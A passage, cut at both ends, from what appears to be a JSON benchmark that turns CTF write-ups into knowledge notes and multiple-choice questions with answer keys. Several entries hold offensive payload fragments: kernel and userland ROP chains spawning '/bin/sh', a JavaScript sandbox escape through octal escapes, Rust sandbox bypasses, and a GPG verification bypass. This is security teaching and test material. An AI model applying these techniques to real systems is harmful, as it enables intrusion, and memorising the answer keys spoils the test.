            "In a scenario where you have extracted password hashes from a memory image during a cybersecurity challenge and need to convert these hashes back to plaintext, which online tool would be most suitable for quickly cracking and finding the plaintext passwords if they exist in a pre-computed lookup table?  - A. Hashcat - B. Crackstation - C. John the Ripper - D. Google Search "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "memsafety",
        "write_up": "dataset/raw/memsafety.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 203,
        "max_score": 233123.2321,
        "difficulty": 0.0008707840834710184,
        "knowledge": [
            "In scenarios where a sandbox limits operations through a Procedural Macro by checking the user-modules Abstract Syntax Tree (AST) for blocked operations, it's possible to bypass these limitations by defining and invoking a macro inside the module. This is because macros defined within the module are processed after the sandbox checks, enabling the execution of otherwise restricted operations.  \n   Example payload:  \n   ```rust\n   macro_rules! bypass_sandbox {\n       () => {\n           // Code that performs operations blocked by the sandbox\n       };\n   }\n   \n   // Usage of the macro to bypass sandbox restrictions\n   bypass_sandbox!();\n   ```",
            "Even when external crates or standard libraries are blocked by an overridden prelude in Rust, the restrictions can be circumvented by using `extern crate` statements to import external crates directly into the scope. This allows for the use of standard or external functions and libraries which are not included in the custom prelude, effectively bypassing these limitations.\n   Example payload:  \n   ```rust\n   extern crate std;\n   use std::fs;\n   \n   // Now, fs functions can be used to read files, etc., bypassing the custom prelude restrictions\n   let content = fs::read_to_string(\"/path/to/file\").expect(\"Failed to read file.\");\n   ```"
        ],
        "question": [
            "In a Rust server implementation where a procedural macro limits certain operations via sandboxing by analyzing the user module's AST, one effective method to bypass these sandbox restrictions involves creating and invoking a macro within the user module itself. Given that macros defined inside the module are parsed after the sandbox checks, how can restricted operations be executed despite the sandbox? - A. Refactor the code avoiding macro usage entirely. - B. Invoke external APIs that indirectly perform the restricted operations. - C. Define and invoke a macro within the module that performs the blocked operations. - D. Use environment variables to execute the restricted operations indirectly. ",
            "In a Rust programming challenge where a custom prelude overrides the standard library, making it inaccessible, and usage of external crates is restricted, which Rust feature can be utilized to circumvent this limitation and directly import external crates or the standard library into the program's scope? - A. Use the `#[path]` attribute to manually import the standard library modules. - B. Use the `extern crate` statement to import external crates or the standard library directly. - C. Declare modules using `mod` and manually implement the functionalities of the standard library. - D. Utilize the `use` keyword to bring specific traits from the standard library into scope without direct import. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "meowmow",
        "write_up": "dataset/raw/meowmow.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 732,
        "max_score": 755,
        "difficulty": 0.9695364238410596,
        "knowledge": [
            "In pwn challenges involving kernel exploitation that requires overcoming ASLR (Address Space Layout Randomization), a strategy is to trigger a heap overflow that allows leaking addresses from adjacent allocations. This technique was utilized by setting an offset near the end of a buffer and performing read or write operations with size parameters that exceed the buffer's boundaries, enabling the leak of adjacent memory contents. Example payload components involve manipulating file descriptors to read memory beyond allocated buffer sizes, such as: `lseek(fdm, 0x3FF, SEEK_SET); read(fdm, buffer, sizeof(buffer));`",
            "To construct a privilege escalation exploit in a pwn challenge involving a kernel environment with protections like SMEP, SMAP, and incomplete KPTI mitigation, a Return-Oriented Programming (ROP) chain can be assembled inside a controlled kernel buffer. This chain is crafted to execute `commit_creds(prepare_kernel_cred(NULL))` to elevate the current process to root. Afterward, carefully pivoting the stack to user-controlled data allows for execution of an `iret` instruction to safely transition back to user mode, effectively bypassing the mentioned kernel protections and mitigations. Example components of constructing such a ROP chain include setting up gadgets like `POPRDI`, `POPRSI`, `POPRDX`, etc., and utilizing offsets to execute kernel functions (`commit_creds`, `prepare_kernel_cred`) from within the kernel context."
        ],
        "question": [
            "In a kernel exploitation scenario involving heap overflow to bypass ASLR, which of the following code components is crucial for leaking address information from adjacent memory allocations? - A. Using `write(fdm, buffer, 0x3FF);` to overwrite memory beyond the allocated buffer. - B. Using `lseek(fdm, 0x3FF, SEEK_SET); read(fdm, buffer, sizeof(buffer));` to read memory beyond the allocated buffer. - C. Employing `fork(); execve(\"/bin/sh\", NULL, NULL);` to create a shell process as a side-effect of overflow. - D. Applying `memcpy(buffer, fake, 0x400);` to copy data into the buffer without checking boundaries. ",
            "When assembling a ROP chain for privilege escalation in a kernel environment with SMEP, SMAP, and partial KPTI mitigations, which sequence effectively escalates privileges and transitions back to userland? - A. Setting up `READ` and `WRITE` system call gadgets to directly modify kernel structures. - B. Arranging gadgets for `fork()` and `execve(\"/bin/sh\", NULL, NULL);` system calls to spawn a new privileged shell. - C. Crafting a sequence involving `POPRDI`, `POPRSI`, `POPRDX`, `commit_creds(prepare_kernel_cred(NULL))`, and using `iret` to return to user mode. - D. Utilizing arithmetic and logic gadgets to directly disable SMEP, SMAP, and KPTI protections in the kernel configuration. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Merriam Webster",
        "write_up": "dataset/raw/Merriam Webster.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2020",
            "https://ctftime.org/event/1067/tasks/"
        ],
        "score": 125,
        "max_score": 1000,
        "difficulty": 0.125,
        "knowledge": [
            "For challenges requiring mass data processing or validation against a standardized set of data (such as validating legitimate words), leveraging local resources like `/usr/share/dict/words` can significantly enhance performance. This approach outpaces online APIs due to the lack of network latency and request processing time.",
            "When faced with challenges that require filtering or classifying data based on certain criteria (real vs. fake words, in this context), using Python dictionaries or sets for item storage and lambda functions for condition-specific processing can streamline the solution. The use of sets facilitates faster lookup times due to their implementation, which is ideal for existence checks within a large dataset. This approach is universally applicable for challenges involving data classification, sorting, or filtering tasks. \n   \n   Example usage in classification tasks:\n   ```python\n   # Filtering non-existent words from a given list\n   def get_fake_list(word_list):\n       return list(filter(lambda word: word not in dic_list, word_list.split(\" \")))\n   \n   # Filtering existent (real) words from a given list\n   def get_real_list(word_list):\n       return list(filter(lambda word: word in dic_list, word_list.split(\" \")))\n   ```"
        ],
        "question": [
            "In a scenario where you are tasked with verifying the authenticity of a large number of words as quickly as possible, which method is preferable for performance optimization? - A. Querying an online dictionary API for each word - B. Using a pre-downloaded list of words and scanning through it sequentially for each query - C. Leveraging local resources like `/usr/share/dict/words` for faster data access and processing - D. Manually checking each word in a physical dictionary",
            "When programming a task that involves sorting or filtering a list of words based on their existence in a predefined list (e.g., distinguishing between real and \"fake\" words), which combination of data structure and technique is most effective in Python? - A. Using lists for storage and for-loops for iteration over every element - B. Utilizing Python dictionaries for storage and iterating over keys for checks - C. Leveraging sets for storage and lambda functions for filtering based on existence - D. Employing tuples for storage and index-based access for each item"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Merry Cemetery",
        "write_up": "dataset/raw/Merry Cemetery.md",
        "type": "reverse",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "In WebAssembly based CTF challenges, if the task involves interacting with JavaScript variables or the web environment, one may need to reverse engineer the WebAssembly (WASM) code to understand its interaction with JavaScript. Tools such as those converting `wasm` to a more readable format (e.g., Rust or C) can facilitate the analysis. This reverse engineering step is crucial for finding vulnerabilities or actions (e.g., incrementing variables, conditional checks) that could be exploited to affect the web environment or leak JavaScript variable contents.",
            "In challenges requiring the bypassing of character restrictions in JavaScript code execution, utilizing JavaScript's ability to interpret octal escapes (`\\141` for `a`) can enable the crafting of payloads with restricted character sets. Additionally, accessing the `Function` constructor (e.g., through `\"\".constructor.constructor`) allows for dynamic execution of arbitrary JavaScript code, which can be leveraged to execute code that wouldn't be directly allowed by the challenge's restrictions. This approach can be used to escape sandboxed environments, trigger unintended actions, or leak sensitive information, such as flags.\n\nExample Payload: \n```javascript\n_=aaaa;  \n$='\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162';  \n''[$][$]('\\164\\150\\162\\157\\167 _')()\n```"
        ],
        "question": [
            "When analyzing a WebAssembly module in a Capture The Flag challenge, which of the following statements best describes a common approach for understanding the module's interface with JavaScript? - A. Directly read the WebAssembly bytecode to identify JavaScript function calls. - B. Execute the WebAssembly module extensively until all interactions with JavaScript are observed. - C. Convert the WebAssembly bytecode to a high-level language like Rust or C, using specialized tools, to easier identify how the module interacts with JavaScript. - D. Focus solely on JavaScript code, ignoring the WebAssembly module, to find vulnerabilities.",
            "In a situation where executing JavaScript code with character restrictions is needed, which technique allows for the creation and immediate invocation of an arbitrary function under these constraints? - A. Defining global variables in hexadecimal format and using direct execution with `eval`. - B. Creating strings using Unicode escapes and accessing global objects via their properties. - C. Utilizing JavaScript's ability to interpret octal escapes for constructing strings and accessing the `Function` constructor via property chains for code execution. - D. Submitting ASCII-encoded binary data directly to the JavaScript engine for interpretation as code."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "microscopic",
        "write_up": "dataset/raw/microscopic.md",
        "type": "reverse",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": 488,
        "max_score": 500,
        "difficulty": 0.976,
        "knowledge": [
            "When analyzing an executable with unknown behaviors, decompilation tools like Ghidra are invaluable for initial analysis to understand the functionality and logic within different parts of the code. This includes identifying function calls, variable operations, and control flow which can provide clues on how the executable processes input and what conditions need to be met for specific outcomes like retrieving a flag.",
            "For dynamic analysis and debugging of executables that use ptrace or similar anti-debugging techniques, tools like radare2 can be used to manually inspect and modify the execution flow. This includes jumping to specific functions, modifying register values, and stepping through execution to observe changes in program state. This is particularly useful in situations where the goal is to force the program into a specific state or function that reveals a flag or demonstrates a vulnerability. For example, setting the instruction pointer (`rip`) to the address of a function of interest to force its execution.\n   - Sample of modifying the instruction pointer in radare2: `dr rip=<address>`"
        ],
        "question": [
            "When reversing an executable to understand its functionality using a decompilation tool like Ghidra, which aspect is crucial for an effective initial analysis?  - A. Identifying syntax errors in the source code - B. Correcting the decompiled code to optimize performance - C. Identifying function calls, variable operations, and control flow to understand program logic - D. Converting assembly language to high-level programming languages for better comprehension ",
            "When dynamically analyzing an executable that employs anti-debugging techniques with radare2, what action allows an analyst to directly manipulate the execution flow to achieve a specific program state?  - A. Automatically replaying recorded user inputs to simulate interactions with the program - B. Using automated scripts to bypass all breakpoints and continue execution uninterrupted - C. Setting the instruction pointer (`rip`) to the address of a function to force its execution - D. Applying static analysis techniques to predict the outcome without actual execution "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Microscopium",
        "write_up": "dataset/raw/Microscopium.md",
        "type": "crypto",
        "competition": [
            "NahamCon/2021",
            "https://ctftime.org/event/1281/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with encrypted data in an APK (Android Package Kit) and having access to the part of the code that performs the encryption, it's feasible to reverse-engineer the encryption process to decrypt the data. If the encryption is XOR-based, one can use the property `a = b ^ c <=> b = a ^ c`, where `a` is the encrypted data, `b` is the plaintext, and `c` is the encryption key. This approach is directly applicable when the encrypted data (cipher), partial key, and method of key derivation (e.g., appending a pin to a partial static key and using SHA-256 hashing) are known.\n   - Sample of the decryption process:\n     ```javascript\n     function decode(pin) {\n       const cipher64 = \"EncryptedDataInBase64==\";\n       const partKey = \"staticPartOfKey\" + pin;\n       const cipherBuff = Buffer.from(cipher64, 'base64');\n       const keyBuff = crypto.createHash('sha256').update(partKey).digest();\n       let output = \"\";\n       for (let i = 0; i < cipherBuff.length; i++) {\n         output += String.fromCharCode(cipherBuff[i] ^ keyBuff[i % keyBuff.length]);\n       }\n       return output;\n     }\n     ```",
            "For brute-forcing a pin or password protecting encrypted data, instead of manually iterating over all possible combinations, leveraging node.js's `crypto` module significantly simplifies the process. This method is more efficient and streamlined, particularly when dealing with typical cryptographic functions and operations. It's beneficial in scenarios where the cryptographic operation relies on common hashing algorithms like SHA-256 or encryption standards that are supported by the `crypto` module. \n   - Example usage of the `crypto` module for brute-forcing:\n     ```javascript\n     const crypto = require(\"crypto\");\n\n     function findPin(padBase64, partKey) {\n       const pad = Buffer.from(padBase64, \"base64\");\n       for (let i = 0; i <= 9999; i++) {\n         const pin = i.toString().padStart(4, '0');\n         const hash = crypto.createHash(\"sha256\").update(partKey + pin).digest();\n         let decrypted = \"\";\n         for (let j = 0; j < pad.length; j++) {\n           decrypted += String.fromCharCode(pad[j] ^ hash[j % hash.length]);\n         }\n         if (decrypted.includes(\"flag\")) {\n           console.log(`PIN: ${pin}`);\n           console.log(decrypted);\n           break;\n         }\n       }\n     }\n     ```"
        ],
        "question": [
            "In an Android application development scenario, when tasked with decoding encrypted data using XOR encryption, given the part of a static key and the necessity to append a dynamic pin before hashing, what would be the correct way to harness the known mechanics to decrypt the data?  - A. Use a sequential search algorithm to match the known part of the static key with random bytes until a readable output is found. - B. Append the dynamic pin to the static key part and perform a SHA-256 hash, then XOR the result with the encrypted data to decode it. - C. Directly XOR the encrypted data with the static key part without appending the dynamic pin or using hash functions. - D. Incrementally append numbers to the static key part, without hashing, and XOR with encrypted data to check for meaningful output. ",
            "When brute-forcing a pin to decrypt data in a node.js environment, why is using the `crypto` module recommended over manual iteration and conversion methods for handling cryptographic operations?  - A. The `crypto` module inherently decrypts any data without the need for specifying cryptographic algorithms or keys. - B. It provides functions to directly guess the pin without conducting any cryptographic operations, thus speeding up the brute-forcing process. - C. Utilizing the `crypto` module simplifies handling common cryptographic functions like SHA-256 hashing and streamlines the process of brute-forcing by efficiently managing buffers and binary data. - D. The `crypto` module allows bypassing encryption entirely, revealing the pin directly through built-in functions designed for forensic analysis. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "military-crypto",
        "write_up": "dataset/raw/military-crypto.md",
        "type": "crypto",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 430,
        "max_score": 500,
        "difficulty": 0.86,
        "knowledge": [
            "When facing challenges that involve uploading and verifying firmware or files with detached signatures, it's useful to understand that tools like `gpg` can verify both signed files (where the content and signature are both in one file) and files with detached signatures (where the content and signature are in separate files). Under certain conditions, providing a signed file instead of a separate signature file can trick the verification process into ignoring the intended content file. This knowledge is crucial when the verification process does not explicitly specify the data file to `gpg`, allowing for the verification of an unintended file.  \nExample exploit strategy: If a service uses `gpg --verify` without specifying the data file explicitly, an attacker can upload a self-contained signed message as a \"signature\" to bypass the verification process intended for a separate data and signature file setup.",
            "In scenarios where you have control over the content being verified and the verification process does not enforce strict checking of file integrity beyond signature validation, submitting a malicious executable script (e.g., a shell script launching `/bin/bash`) as the content file, paired with a valid signed message as the \"signature,\" can lead to arbitrary code execution on the target system. This approach capitalizes on the verification tool's behavior of treating a single input as a self-verifying signed message, thus neglecting the actual content file intended for verification.  \nExample payload: A bash script that contains `#!/bin/bash` followed by arbitrary commands, submitted as the firmware update file with a signed message (which passes `gpg` verification) acting as the detached signature."
        ],
        "question": [
            "In the context of verifying firmware updates via GPG, what happens if a self-contained signed message is uploaded as the \"detached signature\" without explicitly specifying the data file for verification? - A. GPG rejects the signature as invalid since it's not in a detached format. - B. GPG solely verifies the uploaded signed message, ignoring the actual data file it was meant to verify. - C. The GPG verification process crashes due to format incompatibility. - D. GPG automatically encrypts the data file using the signed message as a key.",
            "Considering a scenario where a system's firmware update mechanism solely relies on GPG signature verification without enforcing strict file integrity checks beyond the signature validation, which of the following files, if submitted as a firmware update, could potentially be executed on the system given a valid signed message provided as its \"signature\"? - A. A PDF document detailing the firmware's features. - B. An image file with embedded executable code in its metadata. - C. A plaintext file containing a list of authorized users. - D. A bash script prefixed with `#!/bin/bash` and containing arbitrary commands."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Mind Space",
        "write_up": "dataset/raw/Mind Space.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 287,
        "max_score": 500,
        "difficulty": 0.574,
        "knowledge": [
            "When designing a brute-force attack for a challenge requiring numeric string cracking, efficiently narrowing down the brute-force range is key. Numeric strings can often be brute-forced with a small range if their properties are analyzed correctly. Utilizing conditions inside the verification function can significantly reduce the brute-force space. For instance, conditions on numeric value length, specific digits at certain positions, or mathematical operations that the input must satisfy can guide the construction of a more efficient brute-force algorithm.",
            "In challenges involving format string vulnerabilities, payload crafting can bypass protections like canaries by exploiting weaknesses in functions like `scanf`. If a function behaves unexpectedly with certain inputs (e.g., returning a negative value without altering memory where a pointer points), this behavior can be leveraged to craft payloads that maintain stack integrity while still overwriting critical memory locations. A practical exploit technique involves providing inputs that the vulnerable function does not process (e.g., a \"-\" for `scanf` expecting a floating point number), thereby avoiding altering memory locations like canaries and facilitating a buffer overflow attack without triggering built-in protections.\n   \nExample payload: Use `\"-\"` for each expected number input until the overflow portion of the payload is reached, then follow with numbers encoding the ROP chain or shellcode pointer addresses, bypassing the canary check."
        ],
        "question": [
            "When attempting to brute-force a password that is a numeric string, which of the following methods could effectively reduce the search space? - A. Only using prime numbers as potential passwords. - B. Generating passwords based on the standard numeric string length and special conditions such as specific characters at predetermined positions. - C. Utilizing a dictionary attack with common passwords and phrases. - D. Focusing on passwords with an even distribution of digits from 0 to 9.",
            "In dealing with a format string vulnerability, which of the following inputs can exploit a `scanf` function to bypass stack canary protection and not alter the canary's memory location? - A. Using a sequence of null bytes until the payload is reached. - B. Submitting a balanced mix of alphanumeric characters to fill the buffer. - C. Providing the character \"-\" for every expected floating-point number input to prevent memory alteration at the pointer's location. - D. Injecting a carefully crafted format string that directly targets the canary's known value."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Mindgames 1338",
        "write_up": "dataset/raw/Mindgames 1338.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 470,
        "max_score": 497,
        "difficulty": 0.9456740442655935,
        "knowledge": [
            "When dealing with stack canaries in a binary exploitation challenge, it is essential to leak the canary value before attempting to overwrite the control flow. This can be achieved by finding a way to read arbitrary memory contents, such as using an out-of-bounds read vulnerability or, as seen in the challenge, leaking memory addresses consecutively till reaching the canary's location. The key takeaway is to use a visible pointer in memory that can lead to the stack canary's location, for instance, libc's `environ` variable, which stores a pointer to the stack.",
            "After bypassing stack canaries and PIE (Position Independent Execution), using Return-Oriented Programming (ROP) to chain gadgets for arbitrary code execution is a viable technique. The process involves:\n   - Leaking necessary addresses such as libc base and PIE base to calculate offsets dynamically.\n   - Finding and utilizing ROP gadgets to control the flow of execution, for example, `POPRDI` to set up the argument for a function call.\n   - Calling system functions such as `system(\"/bin/sh\")` to spawn a shell by carefully crafting the payload with appropriate gadgets and function addresses based on the leaked addresses.\n\nExample Payload Part for ROP:\n```\n$payload  = str_repeat(\"x\", 0x108);\n$payload .= pack(\"Q\", $canary); // Overwrite the canary value leaked earlier\n$payload .= pack(\"Q\", 0xdeadbeef); // Placeholder for the base pointer (rbp)\n$payload .= pack(\"Q*\",\n    $libc + POPRDI, $libc + BINSH, // Set first argument of 'system' to '/bin/sh'\n    $base + PUTS, // Return address placeholder, could be used for further leaks\n\n    $libc + POPRDI, $libc + BINSH, // Setup for calling 'system(\"/bin/sh\")'\n    $libc + SYSTEM, // Address of 'system'\n\n    -1 // End of ROP chain\n);\n```"
        ],
        "question": [
            "In the context of bypassing stack canaries during binary exploitation, which method allows for the effective leakage of a stack canary to proceed with control-flow hijacking? - A. Directly overwrite the stack canary with a brute-force approach. - B. Utilize an out-of-bounds write to corrupt the canary value. - C. Leak adjacent memory contents until reaching the stack canary, using a pointer like `environ` for navigation. - D. Intercept and manipulate the binary's execution flow to disable stack canary checks.",
            "During the exploitation phase that involves Return-Oriented Programming (ROP) after bypassing stack canaries and PIE, which step is crucial for preparing the environment to execute arbitrary code, specifically to spawn a shell? - A. Overwrite the return address directly to point to the `system(\"/bin/sh\")` function. - B. Use a direct call to `execve(\"/bin/sh\", NULL, NULL)` without setting up the stack. - C. Create a ROP chain that includes setting up function arguments, such as using `POPRDI` to pass `\"/bin/sh\"` to `system()`. - D. Allocate new executable memory on the heap and copy the `/bin/sh` string there."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Mine Sweeping",
        "write_up": "dataset/raw/Mine Sweeping.md",
        "type": "misc",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 84,
        "max_score": 952,
        "difficulty": 0.08823529411764706,
        "knowledge": [
            "When dealing with software or games that involve random elements or game states saved between sessions, tracking and recording state changes such as the positions of elements (like mines in a mine sweeping game) can be a viable strategy. This can be accomplished through manual logging of state changes or using automation to capture state changes over time. This approach relies on the assumption that certain elements of the state (like the configuration of mines) do not change between sessions, allowing for a mapping of the terrain or state space with enough time and effort.",
            "Reverse engineering and dynamic analysis of software can reveal underlying data structures and state information, such as global arrays used to determine game states or element positions. Manipulating these directly through memory editing or modifying the source code (if available) can alter the game state to achieve a desired outcome, such as triggering a win condition directly. This is particularly effective in cases where the software's logic or state determinants are not obfuscated or are easily understandable upon inspection. For instance, identifying the conditions for win or lose scenarios in a game's code and altering them to force a winning scenario regardless of the actual game state."
        ],
        "question": [
            "In the context of a mine-sweeping game analysis, the method to bypass the random game elements and ensure a consistent game state involves the recording of specific game elements' positions. Which strategy is most effective for dealing with games that do not alter the state of these positions across sessions? - A. Recreating the game's random number generator seed for each session. - B. Manually logging the positions of elements like mines after each game session. - C. Frequently restarting the game to get a favorable starting position. - D. Using an advanced AI to predict the positions of mines before starting the game.",
            "Given the challenge involves a game where the win or lose condition is determined by global arrays, and direct manipulation of these arrays can alter the game's outcome, what approach is best suited to alter the game state to achieve a desired outcome like triggering a win condition? - A. Adjust in-game settings to lower the difficulty and alter the win condition indirectly. - B. Modify the game's graphical textures to reveal hidden elements like mines. - C. Using in-game cheats or codes provided by the developers to skip levels or reveal mines. - D. Reverse engineering the game code to identify and alter global arrays or conditions for win states."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Mine The Gap",
        "write_up": "dataset/raw/Mine The Gap.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": -1,
        "max_score": 320,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving complex puzzles or simulations (like Minesweeper) that resemble logical systems, transforming the game's problem into an equivalent computational problem (in this case, SAT - Boolean satisfiability problem) can make it solvable using computational tools. Specifically, logic circuits or patterns within the puzzle can be represented and solved using SAT solvers such as **z3** or custom solvers designed for that logic structure.",
            "When designing a solution for converting puzzles into satisfiability problems, the puzzle need to be encoded in a way that a SAT solver can process. This includes translating the game elements into variables (e.g., board cells as variables), formulating constraints (e.g., mines near a cell), and then inputting these constraints in a format compatible with the SAT solver (e.g., DIMACS for CNF - Conjunctive Normal Form). An efficient encoding is critical for the solver\u2019s performance and the feasibility of finding a solution within a reasonable time.\n\n   Example encoding step for a cell with unknown neighbors:\n   ```python\n   def unknown_neighbours(board, i, j):\n       neighbors = []\n       for h in range(i-1, i+2):\n           for w in range(j-1, j+2):\n               # board[h][w]>8 checks for unknown or mine cells\n               if 0 <= h < len(board) and 0 <= w < len(board[0]) and board[h][w] > 8:\n                   neighbors.append((h, w))\n       return neighbors\n   ```"
        ],
        "question": [
            "In the context of a Minesweeper challenge being transformed into a SAT-solving problem, which approach would be considered effective for handling the logical systems seen in complex puzzles like the Minesweeper circuit structures described? - A. Running exhaustive search algorithms to manually find the solution. - B. Utilizing SAT solvers such as **z3** to automatically find solutions based on logic circuits or patterns identified. - C. Applying machine learning models to predict the layout of mines without direct logical analysis. - D. Using regular expression matching to directly pinpoint the locations of remaining mines.",
            "In the process of converting a Minesweeper puzzle into a satisfiability problem for a SAT solver, when specifically dealing with the step of handling cells with unknown neighbors to create constraints, which of the following best exemplifies how to encode the puzzle correctly? - A. Encoding the puzzle's grid using a 2D array without detailing specific cell conditions. - B. Directly inputting the game's visual representation into the SAT solver without any form of encoding. - C. Utilizing loops to check each cell's neighbors to determine if they are unknown or mines, as shown by the condition `board[h][w] > 8`, and then collecting these in a list for further processing. - D. Assigning random values to each cell in the puzzle and hoping the SAT solver can deduce the correct layout from these initial guesses."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Minesweeper",
        "write_up": "dataset/raw/Minesweeper.md",
        "type": "misc",
        "competition": [
            "CSAW/2017/Quals",
            "https://ctftime.org/event/488/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing or reverse-engineering a binary program that is suspected to be compressed or packed, especially if it's a challenge related to binary exploitation, it is valuable to check for and unpack the binary first. This is because packing or compressing binaries is a technique often used to obfuscate code, making analysis difficult. Tools like UPX can be used to unpack these executables. Upon unpacking, one can use tools like `checksec` to inspect the security properties of the binary, such as stack canaries, NX bit, PIE, and RELRO.",
            "In scenarios involving heap-based vulnerabilities, particularly when the challenge involves arbitrary-size allocations or buffer overflows, one can exploit out-of-bounds write vulnerabilities to achieve arbitrary code execution. Key steps \ninvolve understanding the vulnerable binary's behavior around heap allocations and identifying how input affects heap state. Strategies include:  \n    - Leaking memory addresses (stack, heap, libc) to defeat ASLR. This can be achieved by manipulating the program to disclose memory contents, e.g., uninitialized heap memory or improperly handled outputs.\n    - Calculating offsets to critical structures or return addresses based on leaked addresses.\n    - Crafting payloads to overwrite function pointers, return addresses, or similar control structures with addresses of injected shellcode or existing gadgets in the binary (ROP).\n    - Considering the executable's security mechanisms (e.g., NX, PIE) to plan the payload. For instance, if NX is disabled and the heap is executable (RWX), one can directly inject and execute shellcode on the heap.\n\nSample payload (conceptual, specifics depend on the binary's layout and vulnerabilities): \n```python\npayload = 'A'*offset + p32(heap_shellcode_addr) + shellcode\n```\nThis payload pattern assumes an overflow allowing control of a saved return address, where `heap_shellcode_addr` is the address of the injected shellcode on the heap crafted based on a leaked heap address, and `shellcode` is the attacker's code to be executed."
        ],
        "question": [
            "In the context of analyzing a binary executable that is suspected to be packed with UPX and aiming to unpack it for further analysis, you have performed the following commands:  ```bash $ file minesweeper minesweeper: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped  $ upx -d minesweeper Ultimate Packer for eXecutables Copyright (C) 1996 - 2013 UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013  File size         Ratio      Format      Name --------------------   ------   -----------   ----------- 13132 <-      7936   60.43%  linux/elf386  minesweeper  Unpacked 1 file. ```  After unpacking, you use `checksec` to inspect its security properties. Which of the following represents a correct approach to understanding the security configurations of the unpacked binary?  - A. Use `ldd` on the binary to list its dynamic dependencies. - B. Use `objdump -D` on the binary to disassemble all its sections. - C. Use `checksec --file=upx` to list security properties like ASLR, NX bit, PIE, and stack canaries. - D. Use `strings upx` to find embedded strings, focusing on security features' names. ",
            "When exploiting a binary with out-of-bounds write vulnerability, considering the security properties of the binary where NX is disabled and the heap is executable, which of the following correctly outlines the exploitation process?  - A. Craft a payload with `NOP` sleds leading to system API calls to bypass the disabled NX. - B. Use ROP gadgets exclusively to redirect the execution to a `return-to-libc` attack. - C. Calculate addresses of the GOT to overwrite function pointers with the address of `system`. - D. Inject shellcode into the heap and use the out-of-bounds write to overwrite a pointer to jump to the shellcode. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "mini dns server",
        "write_up": "dataset/raw/mini dns server.md",
        "type": "reverse",
        "competition": [
            "DownUnderCTF/2023",
            "https://ctftime.org/event/1954/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "In challenges involving DNS queries where the request size is limited, compressing parts of the DNS query can be essential. Specifically, the DNS protocol allows for message compression in the question section by using pointers to a previous occurrence of the same name within the message. This approach can save bytes when dealing with a strict size limit. This technique is particularly useful in scenarios where the DNS query must be under a certain size to elicit a specific server response or to meet challenge requirements. Compression is achieved by replacing redundant parts of the query, such as common domain suffixes (e.g., \".com\"), with a pointer indicating where in the message that data can be found, effectively reusing bits of the message to stay within size constraints.",
            "When crafting custom DNS queries to interact with a DNS server under constraints, direct manipulation of the raw DNS message through byte manipulation can be employed. This involves constructing the DNS header, question fields, and utilizing compression techniques manually. A practical approach includes replacing part of the DNS message (such as the transaction ID or flags in the header) with a compressible domain segment (e.g., \".com\"), and then pointing to this segment from the question section. The header and question sections are built using byte manipulation, with careful calculation of each section's length and format in accordance with DNS protocol specifications. This method allows for precise control over the message's size and content, enabling the crafting of queries that meet specific conditions not achievable through conventional DNS query generation tools or libraries.\n\nExample of manipulating bytes in DNS query for compression:\n```\nheader = b'\\x03com'\ncounts = pack('!HHHH', 1,0,0,0)\nTXT=16\ntarget='free.flag.for.flag.loving.flag.capturers.downunderctf.com'\nqname = [bytes([len(l)]) + l for l in target.encode().split(b'.')[:-1]]\nqs = b''.join(qname) + pack('!H', 0b1100_0000_0000_0000) + pack('!HH', TXT, 1)\nmsg = header + counts + qs\n```"
        ],
        "question": [
            "In the context of DNS protocol optimizations to meet size constraints, particularly under a scenario where the DNS query size must not exceed 72 bytes, which technique is correctly described for reducing the size of a DNS query through message compression? - A. Replacing every domain label with its hexadecimal equivalent to decrease the number of bytes. - B. Utilizing pointers to prior occurrences of the same data in the DNS message, such as domain suffixes, to reduce redundant information. - C. Increasing the size of the DNS header to accommodate additional compression metadata. - D. Converting the query into a shorter hash representation that the server is pre-configured to understand.",
